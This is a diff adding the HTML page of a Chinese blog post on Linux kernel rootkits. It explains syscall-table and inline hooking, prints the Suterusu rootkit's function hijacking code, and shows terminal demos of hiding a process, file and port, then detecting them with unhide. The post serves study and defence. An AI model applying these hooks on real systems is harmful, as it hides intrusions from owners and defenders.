@@ -1,0 +1,796 @@
+<!DOCTYPE html>
+
+
+
+
+<html class="theme-next mist" lang="default">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=consolas:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=5.1.3">
+
+
+
+
+
+
+  <meta name="keywords" content="rootkits," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Consen" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="成功入侵系统后，入侵者一般会通过Rootkits工具来隐藏行踪，提供后门方便后续入侵访问。Rootkits一般会隐藏文件，隐藏进程，隐藏网络端口，过滤日志，总之会隐藏任何未授权行为，使入侵者的活动很难被检测到，入侵者可以持续掌控受害系统。 Rootkits的实现手段多种多样，从应用层到动态链接库层，再到内核层，甚至Hypervisor层，都有各种方法实现Rootkits。在应用层直接替换二进制文件">
+<meta name="keywords" content="rootkits">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux Rootkits">
+<meta property="og:url" content="https://consen.github.io/2018/02/07/linux-rootkits/index.html">
+<meta property="og:site_name" content="Consen">
+<meta property="og:description" content="成功入侵系统后，入侵者一般会通过Rootkits工具来隐藏行踪，提供后门方便后续入侵访问。Rootkits一般会隐藏文件，隐藏进程，隐藏网络端口，过滤日志，总之会隐藏任何未授权行为，使入侵者的活动很难被检测到，入侵者可以持续掌控受害系统。 Rootkits的实现手段多种多样，从应用层到动态链接库层，再到内核层，甚至Hypervisor层，都有各种方法实现Rootkits。在应用层直接替换二进制文件">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://7xtc3e.com1.z0.glb.clouddn.com/linux-rootkits/kernel-attacks.png">
+<meta property="og:updated_time" content="2018-02-07T21:03:45.049Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Linux Rootkits">
+<meta name="twitter:description" content="成功入侵系统后，入侵者一般会通过Rootkits工具来隐藏行踪，提供后门方便后续入侵访问。Rootkits一般会隐藏文件，隐藏进程，隐藏网络端口，过滤日志，总之会隐藏任何未授权行为，使入侵者的活动很难被检测到，入侵者可以持续掌控受害系统。 Rootkits的实现手段多种多样，从应用层到动态链接库层，再到内核层，甚至Hypervisor层，都有各种方法实现Rootkits。在应用层直接替换二进制文件">
+<meta name="twitter:image" content="http://7xtc3e.com1.z0.glb.clouddn.com/linux-rootkits/kernel-attacks.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.3',
+    sidebar: {"position":"left","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '9KGRDNMCOD',
+      apiKey: '05b35fa0784c0870ed641d7477ec8668',
+      indexName: 'myblog',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://consen.github.io/2018/02/07/linux-rootkits/"/>
+
+
+
+
+
+  <title>Linux Rootkits | Consen</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Consen</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description"></h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://consen.github.io/2018/02/07/linux-rootkits/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Consen">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Consen">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">Linux Rootkits</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-02-07T20:58:52+00:00">
+                2018-02-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Security/" itemprop="url" rel="index">
+                    <span itemprop="name">Security</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>成功入侵系统后，入侵者一般会通过Rootkits工具来隐藏行踪，提供后门方便后续入侵访问。Rootkits一般会隐藏文件，隐藏进程，隐藏网络端口，过滤日志，总之会隐藏任何未授权行为，使入侵者的活动很难被检测到，入侵者可以持续掌控受害系统。</p>
+<p>Rootkits的实现手段多种多样，从应用层到动态链接库层，再到内核层，甚至Hypervisor层，都有各种方法实现Rootkits。在应用层直接替换二进制文件如<code>ls</code>、<code>ps</code>、<code>top</code>、<code>netstat</code>等，在动态连接库层Hook库函数如<code>open()</code>、<code>opendir()</code>、<code>readdir()</code>、<code>unlink()</code>等，在内核层Hook系统调用及内核函数，更改内核行为。</p>
+<a id="more"></a>
+<p><img src="http://7xtc3e.com1.z0.glb.clouddn.com/linux-rootkits/kernel-attacks.png" alt="linux kernel attacks"></p>
+<p>从上图可以看出，进程执行流程中的每一步都有可能可能被利用来控制执行行为，本篇博客重点关注内核层。</p>
+<p>内核层最简单的Hook方式是直接将系统调用替换：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">saved_syscall = sys_call_table[SYSCALL_NUMBER];</span><br><span class="line">sys_call_table[SYSCALL_NUMBER] = new_syscall;</span><br></pre></td></tr></table></figure>
+<p>在内核2.6版本之前，<code>sys_call_table</code>是导出符号，可直接引用，在新版内核，该符号不再导出，要替换系统调用，得先找到<code>sys_call_table</code>符号地址，方法有很多，如在System.map符号文件中查找；在/proc/kallsyms中查找；在内存中暴力搜索导出的系统调用如<code>sys_close</code>，<code>sctable[__NR_close] == (unsigned *) sys_close</code>，<code>sctable</code>即<code>sys_call_table</code>地址；在系统调用入口处<code>entry_SYSCALL_64</code>搜索<code>call</code>指令<code>ff 14 c5</code>，其操作数即<code>sys_call_table</code>地址。另外还要解决的一个问题是内存写保护，通过清理<code>CR0</code>寄存器的写保护位，使只读页可写，进而可更改<code>sys_call_table</code>。</p>
+<p>另外一种Hook技术Inline Hooking，不但可以Hook系统调用，还可Hook内核函数，该方法直接修改目标函数指令，跳转到自定义函数。这种技术也是Rootkits <a href="https://github.com/consen/suterusu" target="_blank" rel="noopener">Suterusu</a>用到的Hook技术，Suterusu的Hook框架相当优美，很值得学习。</p>
+<p>如在x64系统下，将目标函数指令替换成<code>mov rax, $addr; jmp rax</code>，这样执行到目标函数时，会先跳转到自定义函数地址<code>$addr</code>执行，执行过程中如需要调用原始目标函数，会将目标函数指令恢复成原始指令调用。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hijack_start</span> <span class="params">( <span class="keyword">void</span> *target, <span class="keyword">void</span> *<span class="keyword">new</span> )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sym_hook</span> *<span class="title">sa</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> o_code[HIJACK_SIZE], n_code[HIJACK_SIZE];</span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">if</span> defined(_CONFIG_X86_)</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> o_cr0;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// push $addr; ret</span></span><br><span class="line">    <span class="built_in">memcpy</span>(n_code, <span class="string">"\x68\x00\x00\x00\x00\xc3"</span>, HIJACK_SIZE);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;n_code[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="keyword">new</span>;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">elif</span> defined(_CONFIG_X86_64_)</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> o_cr0;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// mov rax, $addr; jmp rax</span></span><br><span class="line">    <span class="built_in">memcpy</span>(n_code, <span class="string">"\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0"</span>, HIJACK_SIZE);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;n_code[<span class="number">2</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="keyword">new</span>;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    DEBUG_HOOK(<span class="string">"Hooking function 0x%p with 0x%p\n"</span>, target, <span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(o_code, target, HIJACK_SIZE);</span><br><span class="line"></span><br><span class="line">    o_cr0 = disable_wp();</span><br><span class="line">    <span class="built_in">memcpy</span>(target, n_code, HIJACK_SIZE);</span><br><span class="line">    restore_wp(o_cr0);</span><br><span class="line"></span><br><span class="line">    sa = kmalloc(<span class="keyword">sizeof</span>(*sa), GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> ( ! sa )</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    sa-&gt;addr = target;</span><br><span class="line">    <span class="built_in">memcpy</span>(sa-&gt;o_code, o_code, HIJACK_SIZE);</span><br><span class="line">    <span class="built_in">memcpy</span>(sa-&gt;n_code, n_code, HIJACK_SIZE);</span><br><span class="line"></span><br><span class="line">    list_add(&amp;sa-&gt;<span class="built_in">list</span>, &amp;hooked_syms);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>有了Hook框架，Rootkits的一些操作就很容易实现了。</p>
+<ul>
+<li><strong>隐藏进程</strong></li>
+</ul>
+<p>Hook procfs中<code>/proc</code> file_operations的<code>iterate_shared()</code>，替换<code>filldir()</code>，隐藏指定PID进程。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ps -ef | grep Simple</span><br><span class="line">14549     2011  3482  0 20:21 pts/4    00:00:00 python2.7 -m SimpleHTTPServer</span><br><span class="line">14549     2014 27349  0 20:21 pts/9    00:00:00 grep Simple</span><br><span class="line">$ ./sock 1 2011</span><br><span class="line">Hiding PID 2011</span><br><span class="line">$ ps -ef | grep Simple</span><br><span class="line">14549     2036 27349  0 20:22 pts/9    00:00:00 grep Simple</span><br><span class="line">$ ./sock 2 2011</span><br><span class="line">Unhiding PID 2011</span><br><span class="line">$ ps -ef | grep Simple</span><br><span class="line">14549     2011  3482  0 20:21 pts/4    00:00:00 python2.7 -m SimpleHTTPServer</span><br><span class="line">14549     2039 27349  0 20:22 pts/9    00:00:00 grep Simple</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>隐藏文件</strong></li>
+</ul>
+<p>Hook当前文件系统file_operations的<code>iterate_shared()</code>，替换<code>filldir()</code>，隐藏指定文件和目录。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ls *.c</span><br><span class="line">dlexec.c  hookrw.c  icmp.c  keylogger.c  main.c  module.c  serve.c  sock.c  suterusu.mod.c  util.c</span><br><span class="line">$ ./sock 11 sock.c</span><br><span class="line">Hiding file/dir sock.c</span><br><span class="line">$ ls *.c</span><br><span class="line">dlexec.c  hookrw.c  icmp.c  keylogger.c  main.c  module.c  serve.c  suterusu.mod.c  util.c</span><br><span class="line">$ ./sock 12 sock.c</span><br><span class="line">Unhiding file/dir sock.c</span><br><span class="line">$ ls *.c</span><br><span class="line">dlexec.c  hookrw.c  icmp.c  keylogger.c  main.c  module.c  serve.c  sock.c  suterusu.mod.c  util.c</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>隐藏端口</strong></li>
+</ul>
+<p>以隐藏tcp4端口为例，Hook procfs中<code>/proc/net/tcp</code> seq_operations的<code>show()</code>，隐藏指定端口。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ netstat -anp | grep 8000</span><br><span class="line">(Not all processes could be identified, non-owned process info</span><br><span class="line"> will not be shown, you would have to be root to see it all.)</span><br><span class="line">tcp        0      0 0.0.0.0:8000                0.0.0.0:*                   LISTEN      2011/python2.7</span><br><span class="line">$ ./sock 3 8000</span><br><span class="line">Hiding TCPv4 port 8000</span><br><span class="line">$ netstat -anp | grep 8000</span><br><span class="line">(Not all processes could be identified, non-owned process info</span><br><span class="line"> will not be shown, you would have to be root to see it all.)</span><br><span class="line">$ ./sock 4 8000</span><br><span class="line">Unhiding TCPv4 port 8000</span><br><span class="line">$ netstat -anp | grep 8000</span><br><span class="line">(Not all processes could be identified, non-owned process info</span><br><span class="line"> will not be shown, you would have to be root to see it all.)</span><br><span class="line">tcp        0      0 0.0.0.0:8000                0.0.0.0:*                   LISTEN      2011/python2.7</span><br></pre></td></tr></table></figure>
+<p>检测隐藏进程和端口，可以借助工具<a href="http://www.unhide-forensics.info/?Linux" target="_blank" rel="noopener">unhide</a>。</p>
+<ul>
+<li><strong>检测隐藏进程</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo unhide proc</span><br><span class="line">Used options: </span><br><span class="line">[*]Searching for Hidden processes through /proc stat scanning</span><br><span class="line"></span><br><span class="line">Found HIDDEN PID: 2011</span><br></pre></td></tr></table></figure>
+<p>unhide通过暴力枚举<code>/proc</code>下进程，检测隐藏进程。</p>
+<ul>
+<li><strong>检测隐藏端口</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo unhide-tcp -s</span><br><span class="line">Used options: use_quick </span><br><span class="line">[*]Starting TCP checking</span><br><span class="line"></span><br><span class="line">Found Hidden port that not appears in ss: 8000</span><br><span class="line">[*]Starting UDP checking</span><br></pre></td></tr></table></figure>
+<p>unhide-tcp通过暴力枚举连接端口，检测隐藏端口。</p>
+<p>参考：</p>
+<ul>
+<li><a href="https://en.wikipedia.org/wiki/Rootkit" target="_blank" rel="noopener">Wikipedia Rootkit</a></li>
+<li><a href="http://eisen.io/slides/jeyu_linux_kernel_rootkits_osseu2017.pdf" target="_blank" rel="noopener">Subverting the Linux Kernel</a></li>
+<li><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Leibowitz-Horse-Pill-A-New-Type-Of-Linux-Rootkit.pdf" target="_blank" rel="noopener">Horse Pill – A New Kind of Linux Rootkit</a></li>
+<li><a href="https://www.la-samhna.de/library/rootkits/index.html" target="_blank" rel="noopener">Linux Kernel Rootkits</a></li>
+<li><a href="https://fenix.tecnico.ulisboa.pt/downloadFile/395137904119/dissertacao.pdf" target="_blank" rel="noopener">Rootkits - Detection and Prevention</a></li>
+<li><a href="https://github.com/mncoppola/suterusu/" target="_blank" rel="noopener">Suterusu</a></li>
+<li><a href="https://github.com/NoviceLive/research-rootkit" target="_blank" rel="noopener">Research Rootkit</a></li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:</strong>
+    Consen
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link:</strong>
+    <a href="https://consen.github.io/2018/02/07/linux-rootkits/" title="Linux Rootkits">https://consen.github.io/2018/02/07/linux-rootkits/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice: </strong>
+    All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> unless stating additionally.
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/rootkits/" rel="tag"># rootkits</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/01/19/submit-linux-kernel-patch/" rel="next" title="提交Linux内核Patch">
+                <i class="fa fa-chevron-left"></i> 提交Linux内核Patch
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.png"
+                alt="Consen" />
+            
+              <p class="site-author-name" itemprop="name">Consen</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">27</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">40</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/consen" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://weibo.com/xikangjie" target="_blank" title="Weibo">
+                    
+                      <i class="fa fa-fw fa-weibo"></i>Weibo</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Consen</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
